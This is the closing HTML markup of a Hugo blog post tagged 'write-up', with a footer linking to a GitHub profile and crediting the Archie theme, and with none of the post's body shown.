</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>